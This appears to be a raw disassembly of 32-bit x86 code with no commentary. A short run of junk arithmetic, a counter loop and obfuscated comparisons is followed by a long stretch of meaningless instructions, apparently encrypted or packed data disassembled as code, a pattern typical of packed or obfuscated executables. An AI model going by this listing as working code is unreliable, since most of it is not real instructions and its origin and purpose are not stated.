  402a7b:	add    DWORD PTR ds:0x42d008,esi
  402a81:	xor    ecx,edx
  402a83:	add    esi,DWORD PTR ds:0x429018
  402a89:	mov    esi,0x3272dd
  402a8e:	sub    DWORD PTR ds:0x42d004,0x41ed
  402a98:	push   edi
  402a99:	mov    edi,DWORD PTR [ebp+0x10]
  402a9c:	add    ecx,esi
  402a9e:	mov    DWORD PTR ds:0x42c014,0x852
  402aa8:	cmp    ecx,edi
  402aaa:	mov    DWORD PTR ds:0x42b014,0x2a3e
  402ab4:	je     0x404f9d
  402aba:	inc    ecx
  402abb:	mov    ecx,DWORD PTR [ebp-0x4]
  402abe:	and    DWORD PTR ds:0x42a010,0x0
  402ac8:	mov    edi,DWORD PTR ds:0x42a010
  402ace:	inc    edi
  402acf:	mov    DWORD PTR ds:0x42a010,edi
  402ad5:	cmp    DWORD PTR ds:0x42a010,0x2a
  402adc:	jne    0x402ae8
  402ae2:	call   DWORD PTR ds:0x42ed71
  402ae8:	cmp    DWORD PTR ds:0x42a010,0x1b
  402aef:	jb     0x402ac8
  402af5:	mov    edi,DWORD PTR ds:0x42c00c
  402afb:	sbb    DWORD PTR ds:0x42a01c,edi
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	xor    DWORD PTR ds:0x429010,0x457d
  402b0e:	xor    eax,eax
  402b10:	xor    DWORD PTR ds:0x42c010,0x42b010
  402b1a:	xor    ecx,edx
  402b1c:	add    DWORD PTR ds:0x429028,0x1d9a
  402b26:	add    ecx,esi
  402b28:	add    edi,0xfabdbeed
  402b2e:	mov    DWORD PTR ds:0x42d014,0x7361
  402b38:	adc    eax,0xffffffff
  402b3b:	xor    eax,0x0
  402b3e:	mov    DWORD PTR [ebp-0xc],eax
  402b41:	push   ebx
  402b42:	xor    ebx,ebx
  402b44:	xor    edi,0x8a29a127
  402b4a:	mov    eax,ecx
  402b4c:	add    eax,0xfabdbeed
  402b51:	adc    ebx,0xffffffff
  402b54:	xor    eax,0x8a29a127
  402b59:	xor    ebx,0x0
  402b5c:	cmp    eax,edi
  402b5e:	jne    0x404f2f
  402b64:	cmp    ebx,DWORD PTR [ebp-0xc]
  402b67:	je     0x404f97
  402b6d:	jmp    0x404f2f
  402b72:	mov    esi,0x3272dd
  402b77:	jmp    0x404f2f
  402b7c:	jmp    0x402b15
  402b7e:	iret   
  402b7f:	push   esi
  402b80:	jae    0x402b78
  402b82:	retf   
  402b83:	xchg   edi,eax
  402b84:	mov    al,ds:0xf455e01a
  402b89:	dec    edx
  402b8a:	jle    0x402b97
  402b8c:	jp     0x402c08
  402b8e:	jp     0x402c0a
  402b90:	xlat   BYTE PTR ds:[ebx]
  402b91:	pop    edi
  402b92:	jp     0x402c0e
  402b94:	adc    eax,0x1921172c
  402b99:	and    eax,0x3c652f1b
  402b9e:	imul   esp,DWORD PTR [esi-0x20],0x6d6a6a67
  402ba5:	xor    al,ch
  402ba7:	fsubr  st(1),st
  402ba9:	push   eax
  402baa:	dec    eax
  402bab:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402baf:	pusha  
  402bb0:	ins    DWORD PTR es:[edi],dx
  402bb1:	pop    ecx
  402bb2:	iret   
  402bb3:	pop    ebp
  402bb4:	dec    edx
  402bb5:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  402bbc:	jg     0x402bf5
  402bbe:	jo     0x402b66
  402bc0:	jg     0x402b62
  402bc2:	mov    ds:0x66ff2c3b,al
  402bc7:	fdiv   st(2),st
  402bc9:	push   ebx
  402bca:	jg     0x402bea
  402bcc:	in     eax,dx
  402bcd:	cmp    ebp,ecx
  402bcf:	mov    edx,0xde1387ed
  402bd4:	mov    ebp,DWORD PTR [ecx]
  402bd6:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  402bdd:	fld    QWORD PTR [esp+edx*8]
  402be0:	push   cs
  402be1:	cli    
  402be2:	sbb    BYTE PTR es:[eax+0xc],cl
  402be6:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  402beb:	adc    eax,DWORD PTR [ecx+0x5]
  402bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bef:	(bad)  
  402bf0:	jmp    0x32b4573e
  402bf5:	enter  0xf95b,0x1a
  402bf9:	cli    
  402bfa:	js     0x402b9d
  402bfc:	arpl   bp,bx
  402bfe:	cwde   
  402bff:	pop    edi
  402c00:	mov    esp,DWORD PTR [ecx+0x31821407]
  402c06:	repz sahf 
  402c08:	cmp    al,0x72
  402c0a:	jae    0x402c17
  402c0c:	fisubr DWORD PTR ds:0x33348d52
  402c12:	push   esp
  402c13:	jecxz  0x402be4
  402c15:	mov    ch,BYTE PTR [ecx]
  402c17:	mov    DWORD PTR [eax+0x5188ccb7],esi
  402c1d:	in     al,0x45
  402c1f:	push   edx
  402c20:	dec    esp
  402c21:	or     al,0x3e
  402c23:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  402c2b:	rol    BYTE PTR [esi+edx*2],0xfd
  402c2f:	push   edx
  402c30:	push   esi
  402c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c32:	stc    
  402c33:	push   0x42f8bf
  402c38:	mov    BYTE PTR [edx+0x68],ah
  402c3b:	cdq    
  402c3c:	enter  0xe60e,0x17
  402c40:	jmp    0xdc1c:0xd2dbd364
  402c47:	fwait
  402c48:	retf   0xc0f
  402c4b:	int    0x35
  402c4d:	fs cli 
  402c4f:	and    esi,eax
  402c51:	mov    al,ds:0x5f9458c7
  402c56:	stos   DWORD PTR es:[edi],eax
  402c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c58:	sub    ecx,0x1925cb61
  402c5e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  402c60:	pop    ebp
  402c61:	sub    eax,DWORD PTR [eax]
  402c63:	and    DWORD PTR [edi],0xffffffc3
  402c66:	adc    eax,edi
  402c68:	inc    ecx
  402c69:	and    BYTE PTR [ebx+0x24],cl
  402c6c:	inc    ebp
  402c6d:	leave  
  402c6e:	xor    cl,BYTE PTR [edi-0xb]
  402c71:	mov    esp,DWORD PTR [eax]
  402c73:	cmc    
  402c74:	xchg   ebx,eax
  402c75:	sub    BYTE PTR [edx+0x16],ah
  402c78:	ror    BYTE PTR [esi+0x1bc42b3c],cl
  402c7e:	pop    ss
  402c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c80:	xor    DWORD PTR [eax],0x7de7cef
  402c86:	std    
  402c87:	and    ax,0x7d48
  402c8b:	jb     0x402c6c
  402c8d:	loopne 0x402c35
  402c8f:	sub    dh,BYTE PTR [edx+0x39]
  402c92:	push   edx
  402c93:	int3   
  402c94:	jae    0x402c6b
  402c96:	rcr    BYTE PTR [ecx+0x1e],cl
  402c99:	inc    edx
  402c9a:	je     0x402d19
  402c9c:	retf   0x987d
  402c9f:	in     al,0xb2
  402ca1:	add    DWORD PTR [ecx],ebx
  402ca3:	stos   BYTE PTR es:[edi],al
  402ca4:	xchg   ebp,eax
  402ca5:	leave  
  402ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ca7:	pop    es
  402ca8:	daa    
  402ca9:	pop    esp
  402caa:	pop    es
  402cab:	inc    edx
  402cac:	bound  ecx,QWORD PTR [ebx]
  402cae:	push   ecx
  402caf:	sub    edx,DWORD PTR [ecx]
  402cb1:	jle    0x402d04
  402cb3:	cmp    DWORD PTR [ebx],ebp
  402cb5:	pop    ds
  402cb6:	mov    al,ds:0x843c58d2
  402cbb:	daa    
  402cbc:	scas   al,BYTE PTR es:[edi]
  402cbd:	fidiv  WORD PTR [ebx+esi*4]
  402cc0:	mov    al,0xa5
  402cc2:	push   0x59a82665
  402cc7:	test   ebx,esp
  402cc9:	lahf   
  402cca:	lea    edx,[ebx]
  402ccc:	fcom   QWORD PTR [edi+ecx*2-0x268f6848]
  402cd3:	sbb    DWORD PTR ds:0xf13d4103,0xe
  402cda:	or     ch,BYTE PTR [edi-0xf]
  402cdd:	addr16 test eax,0xb6b20dbd
  402ce3:	mov    edx,DWORD PTR [ecx-0x7f37cff]
  402ce9:	pop    ds
  402cea:	test   BYTE PTR [edi+esi*4-0x13],cl
  402cee:	movhps xmm4,QWORD PTR [esi+esi*2+0x715c4d53]
  402cf6:	xor    DWORD PTR [ebp-0xbba6d57],0xffffffbf
  402cfd:	loopne 0x402c9f
  402cff:	loop   0x402cec
  402d01:	add    al,0x71
  402d03:	cmc    
  402d04:	and    eax,0xebb0067b
  402d09:	(bad)  
  402d0a:	es push ds
  402d0c:	pop    ecx
  402d0d:	scas   eax,DWORD PTR es:[edi]
  402d0e:	mov    eax,0xe78bccd8
  402d13:	mov    dh,0x2a
  402d15:	enter  0x1e1a,0xad
  402d19:	dec    esp
  402d1a:	xor    ecx,DWORD PTR [edx-0x2cd64fc8]
  402d20:	and    bh,BYTE PTR [esi+ebx*4-0x41]
  402d24:	dec    ebx
  402d25:	lds    esp,FWORD PTR [eax]
  402d27:	adc    al,0xa5
  402d29:	inc    ebx
  402d2a:	out    0x29,eax
  402d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d2d:	fdivr  DWORD PTR [ecx-0x57aaea02]
  402d33:	sar    BYTE PTR [eax+edx*2+0x7c970e57],1
  402d3a:	or     esi,DWORD PTR [ebp+0x7c3ff4c0]
  402d40:	(bad)  [esi]
  402d42:	dec    esp
  402d43:	adc    al,0x9
  402d45:	add    DWORD PTR [ecx-0x623e18bf],ecx
  402d4b:	enter  0x48f,0x42
  402d4f:	ss scas eax,DWORD PTR es:[edi]
  402d51:	mov    WORD PTR [edx],gs
  402d53:	aam    0x64
  402d55:	shl    ebp,1
  402d57:	jge    0x402d8e
  402d59:	addr16 and eax,0x223bc5ba
  402d5f:	mov    esi,0x27b47a83
  402d64:	jecxz  0x402d23
  402d66:	aad    0x5b
  402d68:	mov    DWORD PTR [edx+0x2511fa26],0xfe152ffd
  402d72:	not    BYTE PTR [ebx]
  402d74:	fidivr WORD PTR [eax]
  402d77:	xchg   ebp,eax
  402d78:	std    
  402d79:	in     al,dx
  402d7a:	mov    edi,DWORD PTR [ebx+0x15]
  402d7d:	pusha  
  402d7e:	repz mov ds:0xa7cf518,eax
  402d84:	(bad)  
  402d85:	in     al,0x7d
  402d87:	push   ss
  402d88:	jae    0x402d7f
  402d8a:	fwait
  402d8b:	push   esi
  402d8c:	push   edx
  402d8d:	ror    BYTE PTR [ebp-0x2d],0x9
  402d91:	imul   eax,ebx,0xb921c117
  402d97:	aam    0x41
  402d99:	repz popa 
  402d9b:	jg     0x402d3c
  402d9d:	test   dh,bl
  402d9f:	addr16 icebp 
  402da1:	add    ebp,DWORD PTR ds:0xbb063e73
  402da7:	xchg   esp,eax
  402da8:	mov    DWORD PTR [eax-0x5a9f3e93],ecx
  402dae:	jecxz  0x402e18
  402db0:	mov    ebp,0xdd7139af
  402db5:	dec    edi
  402db6:	pop    es
  402db7:	push   eax
  402db8:	inc    BYTE PTR [ebx-0x60b31160]
  402dbe:	jo     0x402d7b
  402dc0:	stc    
  402dc1:	jnp    0x402df9
  402dc3:	inc    ebx
  402dc4:	push   es
  402dc5:	dec    ebp
  402dc6:	mov    bl,0xfc
  402dc8:	sub    BYTE PTR [ecx+0x75],cl
  402dcb:	jb     0x402d4d
  402dcd:	xor    bh,BYTE PTR [ebx+ecx*1-0x64]
  402dd1:	stc    
  402dd2:	mov    ah,BYTE PTR [ebx+ecx*2+0x2b]
  402dd6:	cmp    eax,0xcf579377
  402ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ddc:	or     dh,BYTE PTR [esi+0x3f95bdd5]
  402de2:	cmp    al,0x56
  402de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de5:	push   ds
  402de6:	xchg   BYTE PTR [ebp-0x1bc0d47d],ch
  402dec:	push   ds
  402ded:	test   BYTE PTR [edi-0x299834dc],ah
  402df3:	pop    edx
  402df4:	adc    dh,al
  402df6:	cdq    
  402df7:	push   esi
  402df8:	je     0x402e39
  402dfa:	pop    ss
  402dfb:	xor    DWORD PTR [edi],0xffffffbb
  402dfe:	push   edx
  402dff:	in     eax,0x75
  402e01:	mov    bh,0x7a
  402e03:	loop   0x402d92
  402e05:	inc    esp
  402e06:	call   0x5212:0xf52311a
  402e0d:	xchg   edi,eax
  402e0e:	mov    ?,WORD PTR [edx-0x7b]
  402e11:	adc    al,0xb
  402e13:	pop    ds
  402e14:	push   edx
  402e15:	(bad)  
  402e16:	int    0x3f
  402e18:	adc    cl,BYTE PTR [edi]
  402e1a:	xchg   ebp,eax
  402e1b:	or     eax,0xe4f4fe53
  402e20:	shr    DWORD PTR [edx-0x13987314],cl
  402e26:	dec    ebx
  402e27:	push   cs
  402e28:	shl    BYTE PTR [esi+0x2ceee441],1
  402e2e:	adc    ch,BYTE PTR [ebp+ebx*4+0x54]
  402e32:	das    
  402e33:	stos   DWORD PTR es:[edi],eax
  402e34:	clc    
  402e35:	je     0x402e95
  402e37:	aas    
  402e38:	call   0xefd00884
  402e3d:	repz cwde 
  402e3f:	repz xchg ecx,eax
  402e41:	out    0x8a,eax
  402e43:	push   cs
  402e44:	and    DWORD PTR [ecx+eax*4+0x420a2833],eax
  402e4b:	push   ebp
  402e4c:	stc    
  402e4d:	adc    ch,BYTE PTR [edx-0x474f2f95]
  402e53:	inc    edi
  402e54:	jg     0x402ec0
  402e56:	push   ecx
  402e57:	mov    edi,0x1c6d8cd
  402e5c:	adc    al,0xda
  402e5e:	and    ebp,edx
  402e60:	ss enter 0xd29b,0x4d
  402e65:	xor    BYTE PTR [ecx+0x49],al
  402e68:	jo     0x402df5
  402e6a:	iret   
  402e6b:	fwait
  402e6c:	dec    eax
  402e6d:	jnp    0x402e31
  402e6f:	mov    ecx,0x8d868891
  402e74:	adc    al,0xe1
  402e76:	loopne 0x402ee5
  402e78:	outs   dx,DWORD PTR ds:[esi]
  402e79:	cmp    DWORD PTR [eax-0x29],esp
  402e7c:	jnp    0x402e6f
  402e7e:	push   0xe6db5fd5
  402e83:	lods   al,BYTE PTR ds:[esi]
  402e84:	xor    ax,0x1212
  402e88:	imul   edx,edx,0x32
  402e8b:	cdq    
  402e8c:	sahf   
  402e8d:	out    dx,al
  402e8e:	push   edx
  402e8f:	or     bl,BYTE PTR [edi+0x35]
  402e92:	aam    0x7f
  402e94:	adc    DWORD PTR ds:0x93ba172a,edi
  402e9a:	repnz popf 
  402e9c:	fld    QWORD PTR [edx+0x18ee22d4]
  402ea2:	sti    
  402ea3:	mov    al,0x3f
  402ea5:	lea    edx,[ebp-0x63ce05b0]
  402eab:	not    BYTE PTR [ecx+0x652294bf]
  402eb1:	retf   
  402eb2:	rcr    BYTE PTR cs:[edi-0x65fe977b],0x1b
  402eba:	dec    ecx
  402ebb:	dec    ebx
  402ebc:	dec    edi
  402ebd:	inc    esi
  402ebe:	neg    DWORD PTR [eax]
  402ec0:	jge    0x402e5e
  402ec2:	pop    es
  402ec3:	pushf  
  402ec4:	adc    ecx,eax
  402ec6:	data16 fadd DWORD PTR [esi-0x1e3a55f3]
  402ecd:	fnsave [eax+ecx*1]
  402ed0:	mov    al,ds:0xe54c5a8a
  402ed5:	rcr    eax,0x5b
  402ed8:	push   cs
  402ed9:	mov    eax,ds:0x8f3be0c7
  402ede:	and    bl,al
  402ee0:	jne    0x402eb3
  402ee2:	stos   DWORD PTR es:[edi],eax
  402ee3:	int3   
  402ee4:	push   ebx
  402ee5:	jo     0x402ed5
  402ee7:	push   ebp
  402ee8:	in     eax,dx
  402ee9:	dec    ebp
  402eea:	sub    DWORD PTR [ebx-0x42],ecx
  402eed:	fdiv   DWORD PTR [ebx+ebp*8-0x1818ba12]
  402ef4:	fwait
  402ef5:	das    
  402ef6:	les    ebp,FWORD PTR [ebp+0x6a]
  402ef9:	int3   
  402efa:	jae    0x402e82
  402efc:	or     DWORD PTR [ebx-0x7b],ecx
  402eff:	shr    DWORD PTR [ecx],cl
  402f01:	je     0x402e9e
  402f03:	(bad)  [edx+esi*4]
  402f06:	ins    DWORD PTR es:[edi],dx
  402f07:	pop    ecx
  402f08:	stos   BYTE PTR es:[edi],al
  402f09:	xor    edi,ecx
  402f0b:	jns    0x402edf
  402f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f0f:	mov    eax,DWORD PTR [edi-0xd5b5562]
  402f15:	adc    dh,BYTE PTR [eax+0x4c]
  402f18:	rcr    BYTE PTR [edi-0x6b0deadf],cl
  402f1e:	dec    dl
  402f20:	dec    ebx
  402f21:	jmp    0x7483:0xc0078885
  402f28:	enter  0x262d,0xa9
  402f2c:	retf   
  402f2d:	cld    
  402f2e:	sbb    ebx,ebx
  402f30:	jmp    0x402f31
  402f32:	pop    ss
  402f33:	add    DWORD PTR [esi+0x5d],ebx
  402f36:	jno    0x402ee7
  402f38:	sbb    ch,cl
  402f3a:	mov    bh,0xd
  402f3c:	inc    esi
  402f3d:	cwde   
  402f3e:	ins    BYTE PTR es:[edi],dx
  402f3f:	add    al,0x5a
  402f41:	mov    esp,0xaf1f6411
  402f46:	jae    0x402efc
  402f48:	leave  
  402f49:	xchg   esp,eax
  402f4a:	sub    BYTE PTR [esi-0x3e06bc46],bh
  402f50:	ror    BYTE PTR [esi],cl
  402f52:	cmp    esi,DWORD PTR [ebx]
  402f54:	xchg   ebx,eax
  402f55:	mov    bl,bl
  402f57:	and    eax,DWORD PTR [edx+0x49]
  402f5a:	pop    ss
  402f5b:	cmp    DWORD PTR [ecx-0x55],0xfffffff9
  402f5f:	call   0x97ac:0xe375b352
  402f66:	icebp  
  402f67:	arpl   WORD PTR [ebp-0x74],di
  402f6a:	ret    
  402f6b:	ds popa 
  402f6d:	add    ebx,DWORD PTR gs:[esi]
  402f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f71:	cmp    ah,BYTE PTR [eax]
  402f73:	inc    ebp
  402f74:	imul   ebx,edx,0xffffff87
  402f77:	jp     0x402fd0
  402f79:	push   ebx
  402f7a:	lock popf 
  402f7c:	fiadd  DWORD PTR [ebx+0x2cdf7337]
  402f82:	xor    BYTE PTR [esi+0x78],bh
  402f85:	fst    QWORD PTR ds:0xdcb8befd
  402f8b:	daa    
  402f8c:	fiadd  WORD PTR [ecx+0x167e78ca]
  402f92:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f94:	push   0xccf8aaac
  402f99:	int    0xd8
  402f9b:	fs repz jb 0x402ff3
  402f9f:	adc    DWORD PTR [edx-0x73],edx
  402fa2:	xchg   ebp,eax
  402fa3:	adc    bl,BYTE PTR [esi-0x2fab59aa]
  402fa9:	addr16 dec ecx
  402fab:	add    al,0x38
  402fad:	sub    DWORD PTR [ecx],0x95017864
  402fb3:	xchg   al,al
  402fb5:	mov    al,0xab
  402fb7:	dec    edx
  402fb8:	pop    es
  402fb9:	xchg   ebx,eax
  402fba:	mov    ds:0x687ab8b2,eax
  402fbf:	cld    
  402fc0:	ins    DWORD PTR es:[edi],dx
  402fc1:	jbe    0x402fc7
  402fc3:	inc    edi
  402fc4:	add    eax,0x77b66205
  402fc9:	stos   BYTE PTR es:[edi],al
  402fca:	pushf  
  402fcb:	push   ss
  402fcc:	adc    BYTE PTR [eax-0x2d675b10],dh
  402fd2:	pop    esi
  402fd3:	fiadd  DWORD PTR [eax-0x2f68e6ca]
  402fd9:	ins    BYTE PTR es:[edi],dx
  402fda:	xchg   BYTE PTR [ecx+0x65989251],dh
  402fe0:	out    0xbd,eax
  402fe2:	add    edx,ebx
  402fe4:	push   cs
  402fe5:	std    
  402fe6:	add    BYTE PTR ds:0x47284f23,bl
  402fec:	js     0x403031
  402fee:	jp     0x40301f
  402ff0:	mov    dl,0xce
  402ff2:	ret    
  402ff3:	inc    eax
  402ff4:	sbb    al,0x50
  402ff6:	xchg   esi,eax
  402ff7:	push   ds
  402ff8:	sub    ah,bh
  402ffa:	retf   
  402ffb:	dec    ebp
  402ffc:	mov    eax,ds:0x1c73fc97
  403001:	sub    bl,ch
  403003:	dec    esp
  403004:	push   edx
  403005:	push   edx
  403006:	leave  
  403007:	adc    cl,BYTE PTR [edx+0x447f011b]
  40300d:	or     eax,0xcce9385d
  403012:	xor    BYTE PTR ds:0x5c61684d,0xc7
  403019:	xchg   esi,eax
  40301a:	mov    WORD PTR [ebx+0x1f440c66],ss
  403020:	fcomp  DWORD PTR [ebp+0x45f45890]
  403026:	jns    0x403045
  403028:	cdq    
  403029:	(bad)  
  40302a:	gs daa 
  40302c:	xor    ebx,DWORD PTR [ebx+0x1f]
  40302f:	aaa    
  403030:	sbb    DWORD PTR [edi-0x53],eax
  403033:	inc    esp
  403034:	xchg   esi,eax
  403035:	call   0xd780142c
  40303a:	ficomp DWORD PTR [ecx+0x518ea054]
  403040:	mov    edx,0x5a53118
  403045:	aad    0x9f
  403047:	mov    ?,WORD PTR [edx]
  403049:	fstp   DWORD PTR [esi-0x5385f4f3]
  40304f:	or     BYTE PTR [esi+0xa5dc750],dl
  403055:	sbb    eax,DWORD PTR [edx+edx*8]
  403058:	and    dl,bh
  40305a:	sbb    al,0x41
  40305d:	into   
  40305e:	lea    ebx,[edi+eiz*1+0x4b]
  403062:	(bad)  
  403063:	jne    0x40302f
  403065:	push   es
  403066:	push   edi
  403067:	popa   
  403068:	inc    ebx
  403069:	inc    eax
  40306a:	pop    edx
  40306b:	data16 loopne 0x40306d
  40306e:	jne    0x40300d
  403070:	stc    
  403071:	call   FWORD PTR [eax-0x2617e847]
  403077:	mov    ah,0x3
  403079:	outs   dx,BYTE PTR ds:[esi]
  40307a:	xor    al,0xab
  40307c:	xor    edi,DWORD PTR [esi-0x24]
  40307f:	outs   dx,BYTE PTR ds:[esi]
  403080:	or     al,0xe5
  403082:	jle    0x4030dc
  403084:	sbb    eax,0xa080c5d2
  403089:	xchg   ebx,eax
  40308a:	xchg   edi,eax
  40308b:	push   es
  40308c:	enter  0xc3d0,0xae
  403090:	adc    al,0xea
  403092:	mov    al,ds:0x4a6b2969
  403097:	xor    al,0xea
  403099:	cmp    dh,BYTE PTR [edi-0x4e]
  40309c:	sub    DWORD PTR [ecx],eax
  40309e:	inc    ecx
  40309f:	mov    ecx,0x48b2e619
  4030a4:	ins    DWORD PTR es:[edi],dx
  4030a5:	repnz xchg si,cx
  4030a9:	jnp    0x4030da
  4030ab:	or     BYTE PTR [edi],ah
  4030ad:	or     al,0xde
  4030af:	pushf  
  4030b0:	into   
  4030b1:	sub    al,0x1a
  4030b3:	jl     0x4030cc
  4030b5:	lds    ecx,FWORD PTR [ebx+0x6d663c61]
  4030bb:	sar    BYTE PTR [ebx-0x42d210b0],0x8d
  4030c2:	xor    eax,0xd9e8740f
  4030c7:	xor    BYTE PTR [ecx-0x28c4ea02],al
  4030cd:	add    cl,dh
  4030cf:	sti    
  4030d0:	and    BYTE PTR [eax-0x57],al
  4030d3:	dec    ebp
  4030d4:	in     al,0xe2
  4030d6:	xchg   ebx,eax
  4030d7:	or     eax,0x9182cc4d
  4030dc:	lock cmp esi,ecx
  4030df:	shl    DWORD PTR [ecx+0x39],1
  4030e2:	(bad)  
  4030e3:	retf   
  4030e4:	mov    esi,eax
  4030e6:	rcl    DWORD PTR [ebx+0x5d],cl
  4030e9:	sahf   
  4030ea:	pusha  
  4030eb:	retf   0x3403
  4030ee:	cmp    DWORD PTR [esi+0x4f],edx
  4030f1:	or     eax,0xa32bf4c8
  4030f6:	in     al,dx
  4030f7:	stos   DWORD PTR es:[edi],eax
  4030f8:	loopne 0x4030c1
  4030fa:	lds    esi,FWORD PTR [ebp-0xd]
  4030fd:	or     DWORD PTR [edi+ecx*2],ecx
  403100:	(bad)  
  403101:	jmp    FWORD PTR [edx+eiz*2-0x13]
  403105:	dec    esi
  403106:	in     eax,dx
  403107:	mov    DWORD PTR [eax],esi
  403109:	pop    DWORD PTR [edx+0x1]
  40310c:	xchg   ebx,eax
  40310d:	jb     0x4030bd
  40310f:	mov    bl,0x6c
  403111:	sbb    ch,bh
  403113:	lds    edx,FWORD PTR [edx+0x4a]
  403116:	jl     0x40310b
  403118:	dec    esi
  403119:	(bad)  
  40311a:	jmp    0x7d43:0x89c21118
  403121:	cmp    ecx,DWORD PTR [edx+ebp*1]
  403124:	ins    BYTE PTR es:[edi],dx
  403125:	call   0x3665:0x3a7f159c
  40312c:	ret    0x902f
  40312f:	mov    ecx,0x324b1e50
  403134:	jg     0x403124
  403136:	sub    bh,BYTE PTR [eax-0x4c]
  403139:	adc    dh,cl
  40313b:	in     eax,dx
  40313c:	jo     0x4030be
  40313e:	ss ffree st(4)
  403141:	push   ebp
  403142:	push   0x6a0fdedc
  403147:	xlat   BYTE PTR ds:[ebx]
  403148:	mov    ds:0xdece36a8,eax
  40314d:	fadd   DWORD PTR [edx]
  40314f:	mov    esi,0xb70c1f4c
  403154:	and    al,BYTE PTR [edi+0x69]
  403157:	jno    0x4031cd
  403159:	fimul  WORD PTR [ebp+esi*4-0x471e6a5e]
  403160:	enter  0x8d27,0x84
  403164:	mov    esp,0x569b3eef
  403169:	dec    ebx
  40316a:	ja     0x4031d4
  40316c:	pop    ebx
  40316d:	sub    dl,BYTE PTR [esi-0x1c]
  403170:	xchg   esi,eax
  403171:	pop    ss
  403172:	into   
  403173:	mov    ebp,0xd2cff17b
  403178:	jnp    0x40318b
  40317a:	scas   eax,DWORD PTR es:[edi]
  40317b:	cwde   
  40317c:	sub    BYTE PTR fs:[edi-0x5976f519],0xfb
  403184:	inc    edi
  403185:	je     0x40313c
  403187:	in     eax,0x3e
  403189:	retf   
  40318a:	jl     0x4031e9
  40318c:	or     BYTE PTR [ebx+0x42],dl
  40318f:	outs   dx,DWORD PTR ds:[esi]
  403190:	cmp    BYTE PTR [esi],al
  403192:	fstp   QWORD PTR [eax-0x4315a01e]
  403198:	mov    dl,ah
  40319a:	adc    edi,eax
  40319c:	add    eax,0xf45e260f
  4031a1:	pop    ecx
  4031a2:	sub    al,dh
  4031a4:	sbb    eax,ecx
  4031a6:	cmp    al,0x5
  4031a8:	and    ebp,esp
  4031aa:	icebp  
  4031ab:	pandn  mm6,QWORD PTR [edx]
  4031ae:	mov    esp,0x4dfa4f09
  4031b3:	in     al,0x25
  4031b5:	arpl   WORD PTR [edx],di
  4031b7:	(bad)  
  4031b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031b9:	or     BYTE PTR [ebx+0x21],0x21
  4031bd:	mov    edi,0xc17c642b
  4031c2:	std    
  4031c3:	jo     0x403162
  4031c5:	inc    esp
  4031c6:	adc    al,BYTE PTR [ecx+0x7152597f]
  4031cc:	push   cs
  4031cd:	sbb    cl,bh
  4031cf:	add    al,bh
  4031d1:	icebp  
  4031d2:	loope  0x403183
  4031d4:	add    dh,ch
  4031d6:	out    dx,al
  4031d7:	and    eax,0x34a61c29
  4031dc:	rol    DWORD PTR ds:0xfe40ee7b,cl
  4031e2:	cs push ds
  4031e4:	sub    BYTE PTR ds:0x2865f486,bh
  4031ea:	outs   dx,DWORD PTR ds:[esi]
  4031eb:	dec    esi
  4031ec:	cmc    
  4031ed:	pop    ebx
  4031ee:	in     al,0xff
  4031f0:	adc    bh,dl
  4031f2:	test   BYTE PTR [edi+0x7d],0xec
  4031f6:	jo     0x403253
  4031f8:	mov    WORD PTR [edx-0x6a],?
  4031fb:	aad    0xe5
  4031fd:	jl     0x4031e1
  4031ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403200:	test   DWORD PTR [ecx],esp
  403202:	mov    edx,0xcdb7faf5
  403207:	jnp    0x40325f
  403209:	inc    edi
  40320a:	fst    QWORD PTR [esi]
  40320c:	scas   eax,DWORD PTR es:[edi]
  40320d:	out    0x5f,eax
  40320f:	mov    ebp,ss
  403211:	dec    ecx
  403212:	xor    DWORD PTR [esi-0x11b3a0ad],eax
  403218:	add    dh,BYTE PTR [eax+ebx*1+0x16ed5489]
  40321f:	jno    0x40325b
  403221:	and    al,al
  403223:	push   edi
  403224:	push   edi
  403225:	pop    ss
  403226:	imul   ebp,DWORD PTR [esp+eiz*4+0x13],0xfffffff3
  40322b:	jmp    0x7839:0xad043b2d
  403232:	xor    cl,BYTE PTR [esi]
  403234:	into   
  403235:	dec    eax
  403236:	pop    ss
  403237:	enter  0x1020,0xae
  40323b:	push   esp
  40323c:	test   BYTE PTR [edx-0x75f10b2],cl
  403242:	mov    ch,0xb7
  403244:	mov    ecx,0xdcd575c1
  403249:	daa    
  40324a:	add    edi,DWORD PTR [edi-0x3c5c87b2]
  403250:	jno    0x403275
  403252:	lods   al,BYTE PTR ds:[esi]
  403253:	mov    dh,0x6d
  403255:	cli    
  403256:	int    0x65
  403258:	xor    eax,0xd566b94a
  40325d:	in     al,dx
  40325e:	fstp   QWORD PTR [eax]
  403260:	dec    ebx
  403261:	ins    BYTE PTR es:[edi],dx
  403262:	cmp    ebx,ebx
  403264:	sub    ebx,DWORD PTR [ebp+0x25154cd7]
  40326a:	push   0xbec256d8
  40326f:	cs mov dl,0x9d
  403272:	pop    ebx
  403273:	and    eax,0x31eef356
  403278:	and    eax,0xd9edbb53
  40327d:	out    dx,al
  40327e:	mov    ds:0x97ab691e,al
  403283:	aad    0xf
  403285:	data16 out 0x56,al
  403288:	cmp    edi,DWORD PTR [ebx-0x321f6368]
  40328e:	ss jle 0x4032cd
  403291:	xchg   ebp,eax
  403292:	jb     0x40326d
  403294:	push   es
  403295:	inc    eax
  403296:	jns    0x40321f
  403298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403299:	pushf  
